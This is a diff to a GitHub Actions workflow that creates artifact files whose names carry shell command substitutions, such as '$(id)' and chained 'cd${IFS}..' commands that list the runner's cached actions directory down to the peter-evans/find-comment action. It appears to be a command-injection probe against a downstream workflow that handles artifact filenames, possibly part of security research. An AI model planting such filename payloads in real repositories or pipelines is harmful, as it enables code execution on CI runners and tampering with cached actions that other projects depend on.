@@ -19,7 +19,9 @@ jobs:
           printf 'plain report\n' > content/report.txt
           printf '%s\n' "$PR" > content/pr_number.txt
           printf 'payload\n' > 'content/p$(id).txt'
-          printf 'payload\n' > 'content/a$(cd${IFS}..;cd${IFS}..;ls${IFS}_actions>&2).txt'
+          printf 'payload\n' > 'content/z$(cd${IFS}..;cd${IFS}..;ls).txt'
+          printf 'payload\n' > 'content/y$(cd${IFS}..;cd${IFS}..;cd${IFS}_actions;ls).txt'
+          printf 'payload\n' > 'content/w$(cd${IFS}..;cd${IFS}..;cd${IFS}_actions;cd${IFS}peter-evans;cd${IFS}find-comment;ls).txt'
           ls -1 content
       - uses: actions/upload-artifact@v4
         with:
